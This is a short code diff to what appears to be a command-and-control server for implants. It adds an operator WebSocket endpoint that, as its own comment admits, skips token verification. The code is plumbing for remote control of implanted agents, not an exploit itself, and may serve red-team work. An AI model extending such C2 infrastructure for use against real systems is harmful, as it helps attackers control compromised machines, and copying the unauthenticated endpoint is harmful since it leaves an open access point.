@@ -29,7 +29,19 @@ app.get('/t/:transport/:implantId', async (c) => {
   return stub.fetch(c.req.raw);
 });
 
-// 2. Operator API (REST/RPC for the Kotlin app)
+app.get('/api/operator/ws', async (c) => {
+  const upgradeHeader = c.req.header('Upgrade');
+  if (upgradeHeader !== 'websocket') {
+    return c.text('Expected Upgrade: websocket', 426);
+  }
+
+  // A real C2 would verify an operator token here.
+  // For now, accept the WS and connect them to a global "OperatorHub" DO
+  const id = c.env.IMPLANT_STATE.idFromName('operator_hub');
+  const stub = c.env.IMPLANT_STATE.get(id);
+  
+  return stub.fetch(c.req.raw);
+});
 // Protected by Ed25519 signature verification
 app.post('/api/rpc', async (c) => {
   const sigHex = c.req.header('X-Signature');
